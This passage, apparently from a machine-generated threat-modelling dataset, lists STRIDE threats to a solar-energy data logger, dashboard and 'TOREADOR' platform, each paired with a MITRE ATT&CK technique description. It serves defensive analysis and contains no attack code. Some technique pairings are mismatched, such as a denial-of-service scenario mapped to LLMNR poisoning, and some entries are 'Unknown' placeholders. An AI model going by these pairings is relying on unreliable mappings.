            ],
            "mitre_technique": {
                "name": "ARP Cache Poisoning",
                "description": "Adversaries may poison Address Resolution Protocol (ARP) caches to position themselves between the communication of two or more networked devices. This activity may be used to enable follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040) or [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002).\n\nThe ARP protocol is used to resolve IPv4 addresses to link layer addresses, such as a media access control (MAC) address.(Citation: RFC826 ARP) Devices in a local network segment communicate with each other by using link layer addresses. If a networked device does not have the link layer address of a particular networked device, it may send out a broadcast ARP request to the local network to translate the IP address to a MAC address. The device with the associated IP address directly replies with its MAC address. The networked device that made the ARP request will then use as well as store that information in its ARP cache.\n\nAn adversary may passively wait for an ARP request to poison the ARP cache of the requesting device. The adversary may reply with their MAC address, thus deceiving the victim by making them believe that they are communicating with the intended networked device. For the adversary to poison the ARP cache, their reply must be faster than the one made by the legitimate IP address owner. Adversaries may also send a gratuitous ARP reply that maliciously announces the ownership of a particular IP address to all the devices in the local network segment.\n\nThe ARP protocol is stateless and does not require authentication. Therefore, devices may wrongly add or update the MAC address of the IP address in their ARP cache.(Citation: Sans ARP Spoofing Aug 2003)(Citation: Cylance Cleaver)\n\nAdversaries may use ARP cache poisoning as a means to intercept network traffic. This activity may be used to collect and/or relay data such as credentials, especially those sent over an insecure, unencrypted protocol.(Citation: Sans ARP Spoofing Aug 2003)\n",
                "id": "attack-pattern--cabe189c-a0e3-4965-a473-dcff00f17213",
                "technique_id": "T1557.002"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker modifies sensor data while in transit to the data logger.",
            "Assumptions": [
                {
                    "Assumption": "No encryption of sensor data in transit.",
                    "Role": "Attacker",
                    "Condition": "Data is transmitted without encryption."
                },
                {
                    "Assumption": "Attacker has access to the communication channel.",
                    "Role": "Attacker",
                    "Condition": "Network is not sufficiently secured."
                },
                {
                    "Assumption": "Sensor data integrity is not verified at the Data Logger.",
                    "Role": "Attacker",
                    "Condition": "Checksums or hashes are not used."
                }
            ],
            "Potential Impact": "Corruption of data leading to faulty predictions and maintenance.",
            "MITRE ATT&CK Keywords": [
                "Tampering",
                "Data Integrity",
                "Network Interception",
                "Modification"
            ],
            "mitre_technique": {
                "name": "Stored Data Manipulation",
                "description": "Adversaries may insert, delete, or manipulate data at rest in order to manipulate external outcomes or hide activity.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating stored data, adversaries may attempt to affect a business process, organizational understanding, and decision making. \n\nStored data could include a variety of file formats, such as Office files, databases, stored emails, and custom file formats. The type of modification and the impact it will have depends on the type of data as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",
                "id": "attack-pattern--0bf78622-e8d2-41da-a857-731472d61a92",
                "technique_id": "T1492"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker with physical access modifies the firmware of sensors to generate falsified data.",
            "Assumptions": [
                {
                    "Assumption": "Physical security measures for sensors are weak or absent.",
                    "Role": "Attacker",
                    "Condition": "Sensors are easily accessible."
                },
                {
                    "Assumption": "Attacker has the capability to reprogram the sensor firmware.",
                    "Role": "Attacker",
                    "Condition": "Technical expertise and tools are available."
                },
                {
                    "Assumption": "Sensor firmware updates are not authenticated.",
                    "Role": "Attacker",
                    "Condition": "No digital signatures or other verification mechanisms."
                }
            ],
            "Potential Impact": "Persistent falsification of sensor data resulting in inaccurate maintenance scheduling.",
            "MITRE ATT&CK Keywords": [
                "Tampering",
                "Firmware",
                "Physical Access",
                "Hardware Compromise"
            ],
            "mitre_technique": {
                "name": "Component Firmware",
                "description": "Some adversaries may employ sophisticated means to compromise computer components and install malicious firmware that will execute adversary code outside of the operating system and main system firmware or BIOS. This technique may be similar to [System Firmware](https://attack.mitre.org/techniques/T1019) but conducted upon other system components that may not have the same capability or level of integrity checking. Malicious device firmware could provide both a persistent level of access to systems despite potential typical failures to maintain access and hard disk re-images, as well as a way to evade host software-based defenses and integrity checks.",
                "id": "attack-pattern--10d5f3b7-6be6-4da5-9a77-0f1e2bbfcc44",
                "technique_id": "T1109"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker modifies the training data used for AI/ML model development within the TOREADOR platform.",
            "Assumptions": [
                {
                    "Assumption": "Insufficient access controls on the TOREADOR platform.",
                    "Role": "Attacker",
                    "Condition": "Attacker gains unauthorized access to the platform."
                },
                {
                    "Assumption": "No integrity verification on the training data.",
                    "Role": "Attacker",
                    "Condition": "Data is not hashed or checksummed."
                },
                {
                    "Assumption": "Access logs are not adequately monitored.",
                    "Role": "Attacker",
                    "Condition": "Unauthorized changes go undetected."
                }
            ],
            "Potential Impact": "Corrupted AI/ML models leading to incorrect predictions and optimizations.",
            "MITRE ATT&CK Keywords": [
                "Tampering",
                "Data Manipulation",
                "AI/ML",
                "Data Integrity"
            ],
            "mitre_technique": {
                "name": "Stored Data Manipulation",
                "description": "Adversaries may insert, delete, or manipulate data at rest in order to manipulate external outcomes or hide activity.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating stored data, adversaries may attempt to affect a business process, organizational understanding, and decision making. \n\nStored data could include a variety of file formats, such as Office files, databases, stored emails, and custom file formats. The type of modification and the impact it will have depends on the type of data as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",
                "id": "attack-pattern--0bf78622-e8d2-41da-a857-731472d61a92",
                "technique_id": "T1492"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An attacker denies submitting misleading data to the Receiver by exploiting inadequate logging.",
            "Assumptions": [
                {
                    "Assumption": "Logging mechanisms are insufficient or inadequately configured.",
                    "Role": "System Administrator",
                    "Condition": "Logs are incomplete or missing."
                },
                {
                    "Assumption": "Attacker has the capability to access and alter logs.",
                    "Role": "Attacker",
                    "Condition": "Logging system is not secure."
                },
                {
                    "Assumption": "No digital signatures on logs to prevent tampering.",
                    "Role": "System Architect",
                    "Condition": "Logs are not tamper-evident."
                }
            ],
            "Potential Impact": "Difficulty in tracing malicious actions or holding the attacker accountable.",
            "MITRE ATT&CK Keywords": [
                "Repudiation",
                "Log Manipulation",
                "Accountability",
                "Evasion"
            ],
            "mitre_technique": {
                "name": "Exploit Public-Facing Application",
                "description": "Adversaries may attempt to exploit a weakness in an Internet-facing host or system to initially access a network. The weakness in the system can be a software bug, a temporary glitch, or a misconfiguration.\n\nExploited applications are often websites/web servers, but can also include databases (like SQL), standard services (like SMB or SSH), network device administration and management protocols (like SNMP and Smart Install), and any other system with Internet accessible open sockets.(Citation: NVD CVE-2016-6662)(Citation: CIS Multiple SMB Vulnerabilities)(Citation: US-CERT TA18-106A Network Infrastructure Devices 2018)(Citation: Cisco Blog Legacy Device Attacks)(Citation: NVD CVE-2014-7169) Depending on the flaw being exploited this may also involve [Exploitation for Defense Evasion](https://attack.mitre.org/techniques/T1211) or [Exploitation for Client Execution](https://attack.mitre.org/techniques/T1203).\n\nIf an application is hosted on cloud-based infrastructure and/or is containerized, then exploiting it may lead to compromise of the underlying instance or container. This can allow an adversary a path to access the cloud or container APIs, exploit container host access via [Escape to Host](https://attack.mitre.org/techniques/T1611), or take advantage of weak identity and access management policies.\n\nAdversaries may also exploit edge network infrastructure and related appliances, specifically targeting devices that do not support robust host-based defenses.(Citation: Mandiant Fortinet Zero Day)(Citation: Wired Russia Cyberwar)\n\nFor websites and databases, the OWASP top 10 and CWE top 25 highlight the most common web-based vulnerabilities.(Citation: OWASP Top 10)(Citation: CWE top 25)",
                "id": "attack-pattern--3f886f2a-874f-4333-b794-aa6075009b1c",
                "technique_id": "T1190"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A user denies acting upon incorrect predictions presented in the dashboard that led to operational disruptions.",
            "Assumptions": [
                {
                    "Assumption": "No audit trails for actions taken based on dashboard insights.",
                    "Role": "System Administrator",
                    "Condition": "Actions are not logged."
                },
                {
                    "Assumption": "Users can perform actions without authentication or authorization.",
                    "Role": "User",
                    "Condition": "Weak or absent user action tracking mechanisms."
                },
                {
                    "Assumption": "Dashboard lacks mechanisms to attribute actions to specific users.",
                    "Role": "System Designer",
                    "Condition": "Inadequate user accountability features."
                }
            ],
            "Potential Impact": "Inability to verify user actions and accountability for operational disruptions.",
            "MITRE ATT&CK Keywords": [
                "Repudiation",
                "User Actions",
                "Tracking",
                "Accountability"
            ],
            "mitre_technique": {
                "name": "Indicator Removal",
                "description": "Adversaries may delete or modify artifacts generated within systems to remove evidence of their presence or hinder defenses. Various artifacts may be created by an adversary or something that can be attributed to an adversary\u2019s actions. Typically these artifacts are used as defensive indicators related to monitored events, such as strings from downloaded files, logs that are generated from user actions, and other data analyzed by defenders. Location, format, and type of artifact (such as command or login history) are often specific to each platform.\n\nRemoval of these indicators may interfere with event collection, reporting, or other processes used to detect intrusion activity. This may compromise the integrity of security solutions by causing notable events to go unreported. This activity may also impede forensic analysis and incident response, due to lack of sufficient data to determine what occurred.",
                "id": "attack-pattern--799ace7f-e227-4411-baa0-8868704f2a69",
                "technique_id": "T1070"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An attacker manipulates metadata while ensuring no audit logs reflect the changes.",
            "Assumptions": [
                {
                    "Assumption": "Lack of tamper-evident mechanisms for metadata.",
                    "Role": "System Architect",
                    "Condition": "Metadata is not digitally signed."
                },
                {
                    "Assumption": "Audit logging for metadata modifications is not enforced.",
                    "Role": "System Administrator",
                    "Condition": "Logs do not capture metadata changes."
                },
                {
                    "Assumption": "Administrative access to modify metadata is poorly secured.",
                    "Role": "Attacker",
                    "Condition": "Insufficient access control policies in place."
                }
            ],
            "Potential Impact": "Inaccurate context for sensor data leading to erroneous predictions without accountability.",
            "MITRE ATT&CK Keywords": [
                "Repudiation",
                "Metadata",
                "Log Bypassing",
                "Manipulation"
            ],
            "mitre_technique": {
                "name": "Stored Data Manipulation",
                "description": "Adversaries may insert, delete, or manipulate data at rest in order to manipulate external outcomes or hide activity.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating stored data, adversaries may attempt to affect a business process, organizational understanding, and decision making. \n\nStored data could include a variety of file formats, such as Office files, databases, stored emails, and custom file formats. The type of modification and the impact it will have depends on the type of data as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",
                "id": "attack-pattern--0bf78622-e8d2-41da-a857-731472d61a92",
                "technique_id": "T1492"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Sensitive sensor data is exposed due to lack of encryption during transmission to the TOREADOR platform.",
            "Assumptions": [
                {
                    "Assumption": "No encryption applied to data in transit.",
                    "Role": "System Architect",
                    "Condition": "Data is transmitted as plaintext."
                },
                {
                    "Assumption": "Network traffic is susceptible to interception.",
                    "Role": "Attacker",
                    "Condition": "Network security measures are weak."
                },
                {
                    "Assumption": "Sensitive information is not segregated from public channels.",
                    "Role": "System Designer",
                    "Condition": "All data flows through the same network infrastructure."
                }
            ],
            "Potential Impact": "Unauthorized access to sensitive operational data of solar energy grids.",
            "MITRE ATT&CK Keywords": [
                "Information Disclosure",
                "Data Transmission",
                "Encryption Failure",
                "Network Interception"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Metadata containing operational details of solar power plants is leaked due to unprotected storage in the TOREADOR platform.",
            "Assumptions": [
                {
                    "Assumption": "Metadata stored without encryption.",
                    "Role": "System Architect",
                    "Condition": "Sensitive details are stored in plaintext."
                },
                {
                    "Assumption": "Access to storage locations is not adequately controlled.",
                    "Role": "System Administrator",
                    "Condition": "Access permissions are not restrictive."
                },
                {
                    "Assumption": "No monitoring mechanisms for storage access.",
                    "Role": "System Operator",
                    "Condition": "Storage access is not audited."
                }
            ],
            "Potential Impact": "Exposure of operational and strategic details about solar power plants.",
            "MITRE ATT&CK Keywords": [
                "Information Disclosure",
                "Metadata Exposure",
                "Storage",
                "Access Control"
            ],
            "mitre_technique": {
                "name": "Data from Cloud Storage",
                "description": "Adversaries may access data from cloud storage.\n\nMany IaaS providers offer solutions for online data object storage such as Amazon S3, Azure Storage, and Google Cloud Storage. Similarly, SaaS enterprise platforms such as Office 365 and Google Workspace provide cloud-based document storage to users through services such as OneDrive and Google Drive, while SaaS application providers such as Slack, Confluence, Salesforce, and Dropbox may provide cloud storage solutions as a peripheral or primary use case of their platform. \n\nIn some cases, as with IaaS-based cloud storage, there exists no overarching application (such as SQL or Elasticsearch) with which to interact with the stored objects: instead, data from these solutions is retrieved directly though the [Cloud API](https://attack.mitre.org/techniques/T1059/009). In SaaS applications, adversaries may be able to collect this data directly from APIs or backend cloud storage objects, rather than through their front-end application or interface (i.e., [Data from Information Repositories](https://attack.mitre.org/techniques/T1213)). \n\nAdversaries may collect sensitive data from these cloud storage solutions. Providers typically offer security guides to help end users configure systems, though misconfigurations are a common problem.(Citation: Amazon S3 Security, 2019)(Citation: Microsoft Azure Storage Security, 2019)(Citation: Google Cloud Storage Best Practices, 2019) There have been numerous incidents where cloud storage has been improperly secured, typically by unintentionally allowing public access to unauthenticated users, overly-broad access by all users, or even access for any anonymous person outside the control of the Identity Access Management system without even needing basic user permissions.\n\nThis open access may expose various types of sensitive data, such as credit cards, personally identifiable information, or medical records.(Citation: Trend Micro S3 Exposed PII, 2017)(Citation: Wired Magecart S3 Buckets, 2019)(Citation: HIPAA Journal S3 Breach, 2017)(Citation: Rclone-mega-extortion_05_2021)\n\nAdversaries may also obtain then abuse leaked credentials from source repositories, logs, or other means as a way to gain access to cloud storage objects.",
                "id": "attack-pattern--3298ce88-1628-43b1-87d9-0b5336b193d7",
                "technique_id": "T1530"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Unauthorized access to dashboard insights due to weak authentication methods.",
            "Assumptions": [
                {
                    "Assumption": "Authentication mechanisms for the dashboard are weak.",
                    "Role": "System Architect",
                    "Condition": "No multi-factor authentication implemented."
                },
                {
                    "Assumption": "Dashboard access is not logged.",
                    "Role": "System Administrator",
                    "Condition": "Access activities are not tracked."
                },
                {
                    "Assumption": "Credentials can be easily compromised.",
                    "Role": "Attacker",
                    "Condition": "Passwords are not strong or frequently updated."
                }
            ],
            "Potential Impact": "Confidential operational insights are accessed by unauthorized individuals.",
            "MITRE ATT&CK Keywords": [
                "Information Disclosure",
                "Dashboard",
                "Weak Authentication",
                "Access Control"
            ],
            "mitre_technique": {
                "name": "Use Alternate Authentication Material",
                "description": "Adversaries may use alternate authentication material, such as password hashes, Kerberos tickets, and application access tokens, in order to move laterally within an environment and bypass normal system access controls. \n\nAuthentication processes generally require a valid identity (e.g., username) along with one or more authentication factors (e.g., password, pin, physical smart card, token generator, etc.). Alternate authentication material is legitimately generated by systems after a user or application successfully authenticates by providing a valid identity and the required authentication factor(s). Alternate authentication material may also be generated during the identity creation process.(Citation: NIST Authentication)(Citation: NIST MFA)\n\nCaching alternate authentication material allows the system to verify an identity has successfully authenticated without asking the user to reenter authentication factor(s). Because the alternate authentication must be maintained by the system\u2014either in memory or on disk\u2014it may be at risk of being stolen through [Credential Access](https://attack.mitre.org/tactics/TA0006) techniques. By stealing alternate authentication material, adversaries are able to bypass system access controls and authenticate to systems without knowing the plaintext password or any additional authentication factors.\n",
                "id": "attack-pattern--51a14c76-dd3b-440b-9c20-2bf91d25a814",
                "technique_id": "T1550"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker overwhelms the Data Logger with excessive data, causing it to drop legitimate packets.",
            "Assumptions": [
                {
                    "Assumption": "Data Logger has limited processing or storage capacity.",
                    "Role": "System Architect",
                    "Condition": "Insufficient capacity planning."
                },
                {
                    "Assumption": "No rate limiting or load balancing mechanisms.",
                    "Role": "System Administrator",
                    "Condition": "Traffic management not implemented."
                },
                {
                    "Assumption": "Monitoring of data inflow does not detect abnormal spikes.",
                    "Role": "Network Administrator",
                    "Condition": "Lack of anomaly detection."
                }
            ],
            "Potential Impact": "Loss of critical sensor data and disruption to data processing.",
            "MITRE ATT&CK Keywords": [
                "Denial of Service",
                "Overload",
                "Network",
                "Data Logger"
            ],
            "mitre_technique": {
                "name": "LLMNR/NBT-NS Poisoning and Relay",
                "description": "Link-Local Multicast Name Resolution (LLMNR) and NetBIOS Name Service (NBT-NS) are Microsoft Windows components that serve as alternate methods of host identification. LLMNR is based upon the Domain Name System (DNS) format and allows hosts on the same local link to perform name resolution for other hosts. NBT-NS identifies systems on a local network by their NetBIOS name. (Citation: Wikipedia LLMNR) (Citation: TechNet NetBIOS)\n\nAdversaries can spoof an authoritative source for name resolution on a victim network by responding to LLMNR (UDP 5355)/NBT-NS (UDP 137) traffic as if they know the identity of the requested host, effectively poisoning the service so that the victims will communicate with the adversary controlled system. If the requested host belongs to a resource that requires identification/authentication, the username and NTLMv2 hash will then be sent to the adversary controlled system. The adversary can then collect the hash information sent over the wire through tools that monitor the ports for traffic or through [Network Sniffing](https://attack.mitre.org/techniques/T1040) and crack the hashes offline through [Brute Force](https://attack.mitre.org/techniques/T1110) to obtain the plaintext passwords. In some cases where an adversary has access to a system that is in the authentication path between systems or when automated scans that use credentials attempt to authenticate to an adversary controlled system, the NTLMv2 hashes can be intercepted and relayed to access and execute code against a target system. The relay step can happen in conjunction with poisoning but may also be independent of it. (Citation: byt3bl33d3r NTLM Relaying)(Citation: Secure Ideas SMB Relay)\n\nSeveral tools exist that can be used to poison name services within local networks such as NBNSpoof, Metasploit, and [Responder](https://attack.mitre.org/software/S0174). (Citation: GitHub NBNSpoof) (Citation: Rapid7 LLMNR Spoofer) (Citation: GitHub Responder)",
                "id": "attack-pattern--0dbf5f1b-a560-4d51-ac1b-d70caab3e1f0",
                "technique_id": "T1171"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker floods the network communication interface of the data logger to exhaust its resources.",
            "Assumptions": [
                {
                    "Assumption": "Insufficient DDoS protection in place.",
                    "Role": "Network Administrator",
                    "Condition": "Network lacks adequate defenses."
                },
                {
                    "Assumption": "Unrestricted access to network channels.",
                    "Role": "System Architect",
                    "Condition": "No segmentation or firewall rules."
                },
                {
                    "Assumption": "Logging and alerting for suspect traffic patterns are not enabled.",
                    "Role": "System Administrator",
                    "Condition": "No monitoring on critical interfaces."
                }
            ],
            "Potential Impact": "Interruptions in data forwarding to the Receiver leading to data loss.",
            "MITRE ATT&CK Keywords": [
                "Denial of Service",
                "Network Flood",
                "Resource Exhaustion",
                "Data Logger"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker targets the dashboard with a DDoS attack, rendering it inaccessible to legitimate users.",
            "Assumptions": [
                {
                    "Assumption": "Dashboard is hosted on a server without DDoS protection.",
                    "Role": "System Administrator",
                    "Condition": "No protection mechanisms deployed."
                },
                {
                    "Assumption": "Network architecture does not include redundancy.",
                    "Role": "System Architect",
                    "Condition": "Single point of failure exists."
                },
                {
                    "Assumption": "Monitoring and alerting systems are insufficient.",
                    "Role": "Network Administrator",
                    "Condition": "Anomalous traffic patterns go undetected."
                }
            ],
            "Potential Impact": "Inability for users to access critical operational insights and dashboards.",
            "MITRE ATT&CK Keywords": [
                "Denial of Service",
                "DDoS",
                "Dashboard",
                "Web Application"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker takes advantage of vulnerabilities in the Data Logger to gain root access.",
            "Assumptions": [
                {
                    "Assumption": "Vulnerabilities exist in the Data Logger firmware.",
                    "Role": "System Architect",
                    "Condition": "Firmware not regularly updated."
                },
                {
                    "Assumption": "Insufficient privilege segregation within the device.",
                    "Role": "System Designer",
                    "Condition": "Users can escalate privileges without detection."
                },
                {
                    "Assumption": "Security patches are not applied consistently.",
                    "Role": "System Administrator",
                    "Condition": "Operational systems are not routinely patched."
                }
            ],
            "Potential Impact": "Complete control over sensor data collection and forwarding processes.",
            "MITRE ATT&CK Keywords": [
                "Elevation of Privilege",
                "Firmware Exploitation",
                "Root Access",
                "Data Logger"
            ],
            "mitre_technique": {
                "name": "Kernel Modules and Extensions",
                "description": "Loadable Kernel Modules (or LKMs) are pieces of code that can be loaded and unloaded into the kernel upon demand. They extend the functionality of the kernel without the need to reboot the system. For example, one type of module is the device driver, which allows the kernel to access hardware connected to the system. (Citation: Linux Kernel Programming)\u00a0When used maliciously, Loadable Kernel Modules (LKMs) can be a type of kernel-mode [Rootkit](https://attack.mitre.org/techniques/T1014) that run with the highest operating system privilege (Ring 0). (Citation: Linux Kernel Module Programming Guide)\u00a0Adversaries can use loadable kernel modules to covertly persist on a system and evade defenses. Examples have been found in the wild and there are some open source projects. (Citation: Volatility Phalanx2) (Citation: CrowdStrike Linux Rootkit) (Citation: GitHub Reptile) (Citation: GitHub Diamorphine)\n\nCommon features of LKM based rootkits include: hiding itself, selective hiding of files, processes and network activity, as well as log tampering, providing authenticated backdoors and enabling root access to non-privileged users. (Citation: iDefense Rootkit Overview)\n\nKernel extensions, also called kext, are used for macOS to load functionality onto a system similar to LKMs for Linux. They are loaded and unloaded through <code>kextload</code> and <code>kextunload</code> commands. Several examples have been found where this can be used. (Citation: RSAC 2015 San Francisco Patrick Wardle) (Citation: Synack Secure Kernel Extension Broken) Examples have been found in the wild. (Citation: Securelist Ventir)",
                "id": "attack-pattern--6be14413-578e-46c1-8304-310762b3ecd5",
                "technique_id": "T1215"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker exploits insufficient access controls in the TOREADOR platform to gain administrator privileges.",
            "Assumptions": [
                {
                    "Assumption": "Weak access control mechanisms in the TOREADOR platform.",
                    "Role": "System Architect",
                    "Condition": "Access controls not robust."
                },
                {
                    "Assumption": "No monitoring or alerts for privilege escalations.",
                    "Role": "System Administrator",
                    "Condition": "Privilege changes are not logged or alerted."
                },
                {
                    "Assumption": "Attack techniques are known and used against the platform vulnerabilities.",
                    "Role": "Attacker",
                    "Condition": "Known exploits applicable to platform's software."
                }
            ],
            "Potential Impact": "Unauthorized management of data, model training, and deployment.",
            "MITRE ATT&CK Keywords": [
                "Elevation of Privilege",
                "Access Control Bypass",
                "Administrator Privileges",
                "Cloud Platform"
            ],
            "mitre_technique": {
                "name": "Bypass User Account Control",
                "description": "Adversaries may bypass UAC mechanisms to elevate process privileges on system. Windows User Account Control (UAC) allows a program to elevate its privileges (tracked as integrity levels ranging from low to high) to perform a task under administrator-level permissions, possibly by prompting the user for confirmation. The impact to the user ranges from denying the operation under high enforcement to allowing the user to perform the action if they are in the local administrators group and click through the prompt or allowing them to enter an administrator password to complete the action.(Citation: TechNet How UAC Works)\n\nIf the UAC protection level of a computer is set to anything but the highest level, certain Windows programs can elevate privileges or execute some elevated [Component Object Model](https://attack.mitre.org/techniques/T1559/001) objects without prompting the user through the UAC notification box.(Citation: TechNet Inside UAC)(Citation: MSDN COM Elevation) An example of this is use of [Rundll32](https://attack.mitre.org/techniques/T1218/011) to load a specifically crafted DLL which loads an auto-elevated [Component Object Model](https://attack.mitre.org/techniques/T1559/001) object and performs a file operation in a protected directory which would typically require elevated access. Malicious software may also be injected into a trusted process to gain elevated privileges without prompting a user.(Citation: Davidson Windows)\n\nMany methods have been discovered to bypass UAC. The Github readme page for UACME contains an extensive list of methods(Citation: Github UACMe) that have been discovered and implemented, but may not be a comprehensive list of bypasses. Additional bypass methods are regularly discovered and some used in the wild, such as:\n\n* <code>eventvwr.exe</code> can auto-elevate and execute a specified binary or script.(Citation: enigma0x3 Fileless UAC Bypass)(Citation: Fortinet Fareit)\n\nAnother bypass is possible through some lateral movement techniques if credentials for an account with administrator privileges are known, since UAC is a single system security mechanism, and the privilege or integrity of a process running on one system will be unknown on remote systems and default to high integrity.(Citation: SANS UAC Bypass)",
                "id": "attack-pattern--120d5519-3098-4e1c-9191-2aa61232f073",
                "technique_id": "T1548.002"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker infiltrates the network and exploits weak system configurations to gain admin access to the Receiver.",
            "Assumptions": [
                {
                    "Assumption": "Network defenses are insufficient, allowing network infiltration.",
                    "Role": "Network Administrator",
                    "Condition": "No strong perimeter defenses."
                },
                {
                    "Assumption": "Weak default configurations are not hardened.",
                    "Role": "System Designer",
                    "Condition": "Default configurations are in place."
                },
                {
                    "Assumption": "No multi-factor authentication for administrative roles.",
                    "Role": "System Administrator",
                    "Condition": "Critical roles lack MFA."
                }
            ],
            "Potential Impact": "Complete control over incoming data to the system leading to potential data tampering.",
            "MITRE ATT&CK Keywords": [
                "Elevation of Privilege",
                "Network Infiltration",
                "Admin Access",
                "Receiver"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        }
    ]
},
{
    "case_number": "9",
    "batch_number": "8",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker could spoof sensor data by compromising the Data Logger.",
            "Assumptions": [
                {
                    "Assumption": "Attacker has access to the network communication interface.",
                    "Role": "Attacker",
                    "Condition": "Network interface is not adequately secured."
                },
                {
                    "Assumption": "Attacker can bypass or disable the root-of-trust.",
                    "Role": "Attacker",
                    "Condition": "Root-of-trust mechanism is not robust."
                },
                {
                    "Assumption": "Data Logger firmware is vulnerable to exploits.",
                    "Role": "Attacker",
                    "Condition": "Firmware has known or unknown vulnerabilities."
                }
            ],
            "Potential Impact": "Data Integrity Compromised - False data could lead to incorrect maintenance predictions.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "network",
                "firmware",
                "data integrity"
            ],
            "mitre_technique": {
                "name": "Component Firmware",
                "description": "Some adversaries may employ sophisticated means to compromise computer components and install malicious firmware that will execute adversary code outside of the operating system and main system firmware or BIOS. This technique may be similar to [System Firmware](https://attack.mitre.org/techniques/T1019) but conducted upon other system components that may not have the same capability or level of integrity checking. Malicious device firmware could provide both a persistent level of access to systems despite potential typical failures to maintain access and hard disk re-images, as well as a way to evade host software-based defenses and integrity checks.",
                "id": "attack-pattern--10d5f3b7-6be6-4da5-9a77-0f1e2bbfcc44",
                "technique_id": "T1109"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "Unauthorized access to the Dashboard by impersonating an employee.",
            "Assumptions": [
                {
                    "Assumption": "Weak or absent authentication mechanisms.",
                    "Role": "Attacker",
                    "Condition": "Dashboard lacks strong authentication policies."
                },
                {
                    "Assumption": "Attacker possesses valid or easily guessable credentials.",
                    "Role": "Attacker",
                    "Condition": "Credentials are leaked or weak."
                },
                {
                    "Assumption": "No additional security measures (e.g., two-factor authentication).",
                    "Role": "Attacker",
                    "Condition": "No multi-factor authentication implemented."
                }
            ],
            "Potential Impact": "Information Disclosure - Sensitive operational data of the solar energy grid could be accessed by unauthorized users.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "web application",
                "credentials",
                "authentication"
            ],
            "mitre_technique": {
                "name": "Password Guessing",
